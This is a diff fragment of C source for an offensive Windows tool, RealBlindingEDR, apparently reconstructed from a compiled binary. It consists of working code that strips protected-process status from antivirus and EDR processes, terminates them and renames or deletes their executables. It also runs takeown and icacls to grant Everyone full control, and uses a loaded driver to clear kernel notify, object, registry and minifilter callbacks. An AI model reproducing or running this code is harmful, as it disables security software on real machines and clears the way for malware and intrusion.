+			if (Process32FirstW(hSnap, &pe)) {
+				do {
+					CHAR Dst[272] = {};
+					memset(Dst, 0, 0x104);
+					wcstombs(Dst, pe.szExeFile, 0x103);
+					if (stricmp(Dst, "msmpeng.exe") == 0 ||
+						stricmp(Dst, "nissrv.exe") == 0 ||
+						stricmp(Dst, "mpcmdrun.exe") == 0) {
+						if (!RemovePPL(pe.th32ProcessID))
+							printf("%s's PPL Remove Faild.\n", Dst);
+						// EXE: OpenProcess(0x1001) = PROCESS_TERMINATE|PROCESS_QUERY_LIMITED_INFORMATION
+						HANDLE v2 = OpenProcess(0x1001u, FALSE, pe.th32ProcessID);
+						void* v3 = v2;
+						if (v2) {
+							if (TerminateProcess(v2, 0))
+								printf("[Success] Killed %s.\n", Dst);
+							else {
+								DWORD LastError = GetLastError();
+								printf("Failed to terminate %s, error %lu\n", Dst, LastError);
+							}
+							CloseHandle(v3);
+						}
+						else {
+							DWORD v4 = GetLastError();
+							// EXE: wchar_t v8[104], memset(0xC8), swprintf(0xC8, "taskkill /f /im %s", Dst)
+							// %s here is NARROW char (Dst is CHAR*)
+							wchar_t v8[104] = {};
+							memset(v8, 0, 0xC8);
+							swprintf(v8, 0xC8 / sizeof(wchar_t), L"taskkill /f /im %S", Dst);
+							printf("Failed to open %s, error %lu, Try to use taskkill, please manually check whether the kill is successful!\n", Dst, v4);
+							ExecProcess((LPCSTR)v8);
+						}
+					}
+				} while (Process32NextW(hSnap, &pe));
+			}
+			CloseHandle(hSnap);
+		}
+		// EXE: RenameFilesInDir calls pass narrow CHAR* which EXE treats as wchar_t*
+		RenameFilesInDir("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform");
+		RenameFilesInDir("C:\\Program Files (x86)\\Windows Defender");
+		RenameFilesInDir("C:\\Program Files\\Windows Defender");
+		printf("[INFO] A total of \"%d Defender file\" was renamed, msmpeng.exe, nissrv.exe, and mpcmdrun.exe were all renamed.\n", g_DefenderRenameCount);
+	}
+}
+
+// Permanently remove AV/EDR: kill processes + rename their executables
+// Mirrors sub_140002CE0 exactly
+VOID RemoveAVForever() {
+	printf("\n----------------------------------------------------\n");
+	printf("Remove AV/EDR Forever: \n----------------------------------------------------\n\n");
+
+	// Elevate token privilege (SE_TAKE_OWNERSHIP_PRIVILEGE=20)
+	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
+	RtlAdjustPrivilegePtr RtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
+	DWORD dwPrevState[3] = {};
+	if (((int(__fastcall*)(__int64, __int64, UINT64, DWORD*))RtlAdjustPrivilege)(20LL, 1LL, 0LL, dwPrevState) < 0) {
+		printf("PrivilegeUpgrade False!\n");
+	}
+
+	// First handle Windows Defender (needs special PPL removal)
+	ClearWindowsDefender();
+
+	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnap == INVALID_HANDLE_VALUE) return;
+	PROCESSENTRY32W pe = {};
+	pe.dwSize = sizeof(pe);
+	if (Process32FirstW(hSnap, &pe)) {
+		do {
+			CHAR name[MAX_PATH] = {};
+			memset(name, 0, 0x104);
+			wcstombs(name, pe.szExeFile, 0x103);
+
+			// EXE: linear search via pointer walk starting at "360qbus.exe" (off_140025490)
+			const CHAR* v4 = "360qbus.exe";
+			INT64 v5 = 0;
+			INT v6 = 0; // isAV flag
+			if (v4) {
+				while (stricmp(name, v4)) {
+					v5 = (UINT)(v5 + 1);
+					v4 = AVProcess[v5];
+					if (!v4) goto LABEL_8;
+				}
+				v6 = 1;
+			}
+			else {
+			LABEL_8:
+				v6 = 0;
+			}
+			if (!v6) continue;
+
+			const CHAR* pplStatus = "NOPPL"; // v7
+
+			// PPL check: EXE uses OpenProcess(0x1000)
+			HANDLE v8 = OpenProcess(0x1000u, FALSE, pe.th32ProcessID);
+			VOID* v9 = v8;
+			if (v8) {
+				BYTE ProcessInformation[4] = {};
+				NTSTATUS InformationProcess = NtQueryInformationProcess(
+					v8, (PROCESSINFOCLASS)67, ProcessInformation, 1u, NULL);
+				CloseHandle(v9);
+				// EXE: !InformationProcess && (ProcessInformation[0] & 7) != 0
+				if (!InformationProcess && (ProcessInformation[0] & 7) != 0) {
+					pplStatus = "PP/PPL";
+					if (dwMajor < 10) {
+						printf("[WARN] The Major version < 10 and does not support removal of process PP/PPL.\n");
+					}
+					else if (!RemovePPL(pe.th32ProcessID)) {
+						printf("%s's PPL Remove Faild.\n", name);
+					}
+				}
+			}
+
+			// Get path: EXE opens v11=OpenProcess(0x1000) AFTER PPL check
+			// ExeName(CHAR[272]) and NewFileName(wchar_t[136]) on stack
+			CHAR ExeName[272] = {};
+			wchar_t NewFileName[136] = {};
+			INT v14 = 0; // gotPath
+
+			HANDLE v11 = OpenProcess(0x1000u, FALSE, pe.th32ProcessID);
+			if (v11) {
+				memset(ExeName, 0, 0x104);
+				memset(NewFileName, 0, 0x104);
+				DWORD dwSz = 260; // dwSize[0]=260
+				if (QueryFullProcessImageNameA(v11, 0, ExeName, &dwSz)) {
+					// EXE: swprintf(NewFileName, 0x104, "%s-RBE", ExeName)
+					// Note: format is %s (narrow), not %S
+					swprintf(NewFileName, 0x104 / sizeof(wchar_t), L"%S-RBE", ExeName);
+					// EXE: check SecurityHealth* first, sets v14=1
+					if (!stricmp(name, "SecurityHealthSystray.exe") ||
+						(v14 = 1, !stricmp(name, "SecurityHealthService.exe"))) {
+						// EXE: wchar_t v27[136], v29[256]
+						wchar_t v27[136] = {};
+						memset(v27, 0, 0x104);
+						// EXE format: "%s" (ExeName is CHAR*)
+						swprintf(v27, 0x104 / sizeof(wchar_t), L"takeown /F \"%S\"", ExeName);
+						ExecProcess((LPCSTR)v27);
+						wchar_t v29[256] = {};
+						memset(v29, 0, 0x104);
+						swprintf(v29, 0x104 / sizeof(wchar_t), L"icacls \"%S\" /grant Everyone:(F)", ExeName);
+						ExecProcess((LPCSTR)v29);
+						v14 = 1; // EXE sets v14=1 again after both cmds
+					}
+					// Note: if neither Systray nor Service matched, v14 stays 0
+				}
+				else {
+					DWORD LastError = GetLastError();
+					printf("Failed to get %s(%s) full path, error %lu\n", name, pplStatus, LastError);
+					v14 = 0;
+				}
+				// EXE: OpenProcess(0x1001) for kill is INSIDE the v11 block
+				HANDLE v15 = OpenProcess(0x1001u, FALSE, pe.th32ProcessID);
+				VOID* v16 = v15;
+				if (v15) {
+					if (TerminateProcess(v15, 0)) {
+						printf("[Success] Killed %s(%s).\n", name, pplStatus);
+						CloseHandle(v16);
+						if (v14) {
+							// EXE: strlen(ExeName) via do-while, stores in v18
+							INT64 v18 = -1LL;
+							do { ++v18; } while (ExeName[v18]);
+							// EXE: checks Dst[v18+271]=='e'(101) && Dst[v18+270]=='x'(120) && Dst[v18+269]=='e'(101)
+							// Dst is 'name' (CHAR[MAX_PATH=260]), so Dst+256 == name+256
+							// Dst[(unsigned)v18+271] = name[(unsigned)v18+271] but name is only 260 bytes
+							// In EXE: Dst is at [rsp+280h], ExeName at [rsp+390h] — they are different stack vars
+							// Dst[v18+271] means Dst + strlen(ExeName) + 271
+							// This is actually checking ExeName[-1], ExeName[-2], ExeName[-3] relative to Dst
+							// Since ExeName is at Dst+272, ExeName[-1]=Dst[271], ExeName[-2]=Dst[270], ExeName[-3]=Dst[269]
+							// So: check ExeName[v18-1]=='e', ExeName[v18-2]=='x', ExeName[v18-3]=='e'
+							// i.e. the last 3 chars of ExeName are 'e','x','e' (.exe ending)
+							if (ExeName[v18-1] == 'e' && ExeName[v18-2] == 'x' && ExeName[v18-3] == 'e') {
+								if (MoveFileA(ExeName, (LPCSTR)NewFileName)) {
+									printf("Renamed to %s\n", (const char*)NewFileName);
+								}
+								else {
+									DWORD v19 = GetLastError();
+									printf("Rename failed, error %lu\n", v19);
+								}
+							}
+						}
+					}
+					else {
+						DWORD v20 = GetLastError();
+						printf("Failed to terminate %s(%s), error %lu\n", name, pplStatus, v20);
+						// EXE: does NOT CloseHandle(v16) here — falls through
+					}
+				}
+				else {
+					DWORD v17 = GetLastError();
+					printf("Failed to open %s, error %lu, Try to use taskkill, please manually check whether the kill/rename is successful!\n",
+						name, v17);
+					// EXE: wchar_t v27[136], memset(0xC8), swprintf(0xC8, "taskkill /f /im %s", Dst)
+					wchar_t v27b[136] = {};
+					memset(v27b, 0, 0xC8);
+					swprintf(v27b, 0xC8 / sizeof(wchar_t), L"taskkill /f /im %S", name);
+					ExecProcess((LPCSTR)v27b);
+					// EXE: wchar_t v29[256], memset(sizeof v29), swprintf(0x200, "move /Y "%s" "%s"", ExeName, NewFileName)
+					wchar_t v29b[256] = {};
+					memset(v29b, 0, sizeof(v29b));
+					swprintf(v29b, 0x200 / sizeof(wchar_t), L"move /Y \"%S\" \"%s\"", ExeName, NewFileName);
+					ExecProcess((LPCSTR)v29b);
+				}
+			}
+			else {
+				DWORD v12 = GetLastError();
+				printf("Failed to open %s with LIMITED_QUERY, error %lu,Please perform manual kill AV and rename AV files!\n",
+					name, v12);
+			}
+		} while (Process32NextW(hSnap, &pe));
+	}
+	CloseHandle(hSnap);
+
+	// Delete 360sdrun.exe specifically (it self-restarts, needs deletion)
+	if (GetFileAttributesA("C:\\Program Files\\360\\360sd\\360sdrun.exe") != INVALID_FILE_ATTRIBUTES) {
+		if (DeleteFileA("C:\\Program Files\\360\\360sd\\360sdrun.exe"))
+			printf("[Success] File 360sdrun.exe deleted successfully.\n");
+	}
+	if (GetFileAttributesA("C:\\Program Files (x86)\\360\\360SD\\360sdrun.exe") != INVALID_FILE_ATTRIBUTES) {
+		if (DeleteFileA("C:\\Program Files (x86)\\360\\360SD\\360sdrun.exe"))
+			printf("[Success] File 360sdrun.exe deleted successfully.\n");
+	}
 }
 CHAR* ReadDriverName(INT64 FLT_FILTERAddr) {
 	
@@ -972,35 +1603,95 @@ int main(int argc, char* argv[])
 	printf("  |  __ / / /__\\`'_\\ : | |  |  __'.| |[  |[ `.-. / /'`\\' |[  |[ `.-. |/ /'`\\;|  _| _  | |  | ||  __ /    \n");
 	printf(" _| |  \\ \\| \\__.// | |,| | _| |__) | | | | | | | | \\__/  | | | | | | |\\ \\._/_| |__/ |_| |_.' _| |  \\ \\_  \n");
 	printf("|____| |___'.__.\\'-;__[___|_______[___[___[___||__'.__.;__[___[___||__.',__|________|______.|____| |___| \n");
-	printf("                                                                     ( ( __))                            \n");
-	if (argc != 3) {
-		printf("Usage: RealBlindingEDR.exe [driver_path] [driver_type]\n\neg: RealBlindingEDR.exe c:\\echo_driver.sys 1\n");
-		return 0;
-	}
-	DrivePath = argv[1];
-	Driver_Type = atoi(argv[2]);
+	printf("                                                                     ( ( __)) @github.com/myzxcg:v1.5.2 \n");
 
-	GenerateRandomName();
-	HINSTANCE hinst = LoadLibraryA("ntdll.dll");
-	if (hinst == NULL) return FALSE;
-	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
-	proc(&dwMajor, &dwMinorVersion, &dwBuild);
-	dwBuild &= 0xffff;
-	if (dwMajor < 10 && Driver_Type == 1) {
-		printf("[ERROR] This driver does not support the %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
-		return 0;
+	// EXE: reads argv only in valid branch, both branches call GenerateRandomName
+	if ((unsigned int)(argc - 3) <= 1) {
+		// valid: argc == 3 or argc == 4
+		const char* v17 = argv[2];
+		DrivePath  = argv[1];
+		Driver_Type = atoi(v17);
+		const char* v18 = NULL;
+		if (argc == 4) v18 = argv[3];
+		ClearMode = v18;
+		GenerateRandomName();
+
+		HINSTANCE hinst = LoadLibraryA("ntdll.dll");
+		if (hinst == NULL) return FALSE;
+		NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
+		proc(&dwMajor, &dwMinorVersion, &dwBuild);
+		dwBuild &= 0xffff;
+
+		// Driver type 1 (EchoDrv) only supports Win10+
+		// Driver type 4 (GPU-Z) only supports Win7 (6.1)
+		// EXE (sub_140002BD0): uses exit(0) not return 0 on incompatible version
+		if (Driver_Type == 1 && dwMajor < 10) {
+			printf("[ERROR] This driver does not support the %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
+			exit(0);
+		}
+		else if (Driver_Type == 4 && dwMajor >= 10) {
+			printf("[ERROR] This driver does not support the %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
+			exit(0);
+		}
+		else {
+			printf("Windows version: %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
+		}
+
+		if (!InitialDriver()) return 0;
+
+		// Clear Process/Thread/Image-load notify callbacks
+		INT64 PspCreateProcessNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateProcessNotifyRoutine");
+		INT64 PspCreateThreadNotifyRoutineAddress  = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateThreadNotifyRoutine");
+
+		if (PspCreateProcessNotifyRoutineAddress) {
+			PrintAndClearCallBack(PspCreateProcessNotifyRoutineAddress, (CHAR*)"PsSetCreateProcessNotifyRoutine");
+		}
+		else {
+			printf("Failed to obtain process callback address.\n");
+		}
+		if (PspCreateThreadNotifyRoutineAddress) {
+			PrintAndClearCallBack(PspCreateThreadNotifyRoutineAddress, (CHAR*)"PsSetCreateThreadNotifyRoutine");
+		}
+		else {
+			printf("Failed to obtain thread callback address.\n");
+		}
+		// PsSetLoadImageNotifyRoutine: EXE condition: if (Size != 3 || dwBuild < 0x55F0)
+		// i.e. only SKIP when Driver_Type==3 AND dwBuild >= 0x55F0
+		if (Driver_Type != 3 || dwBuild < 0x55F0) {
+			INT64 PspLoadImageNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetLoadImageNotifyRoutine");
+			if (PspLoadImageNotifyRoutineAddress) {
+				PrintAndClearCallBack(PspLoadImageNotifyRoutineAddress, (CHAR*)"PsSetLoadImageNotifyRoutine");
+			}
+			else {
+				printf("Image loading callback address acquisition failed.\n");
+			}
+		}
+
+		ClearObRegisterCallbacks();
+		ClearCmRegisterCallback();
+		ClearMiniFilterCallback();
+
+		// If 4th argument is "clear" AND Driver_Type != 2, permanently remove AV/EDR
+		// EXE: if (v18 && Size != 2 && !stricmp(v18, "clear"))
+		if (ClearMode != NULL && Driver_Type != 2 && stricmp(ClearMode, "clear") == 0) {
+			RemoveAVForever();
+		}
+		else {
+			printf("\n----------------------------------------------------\n[INFO] No option to permanently close AV/EDR, skip execution.\n");
+		}
+
+		printf("\n----------------------------------------------------\n");
+		UnloadDrive();
+		//system("pause");
 	}
 	else {
-		printf("Windows version: %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
+		// EXE: in invalid-argc path, still calls GenerateRandomName then prints usage
+		GenerateRandomName();
+		printf("Usage: RealBlindingEDR.exe [driver_path] [driver_type] [clear]\n");
+		printf("Supported driver numbers: 1, 2, 3, 4\n\n");
+		printf("eg: RealBlindingEDR.exe c:\\echo_driver.sys 1\n");
+		printf("eg: RealBlindingEDR.exe c:\\echo_driver.sys 1 clear   --- (Permanently delete AV/EDR)\n");
 	}
-	if (!InitialDriver()) return 0;
-
-	ClearThreeCallBack();
-	ClearObRegisterCallbacks();
-	ClearCmRegisterCallback();
-	ClearMiniFilterCallback();
-	
-	UnloadDrive();
-	//system("pause");
+	return 0;
 }
 
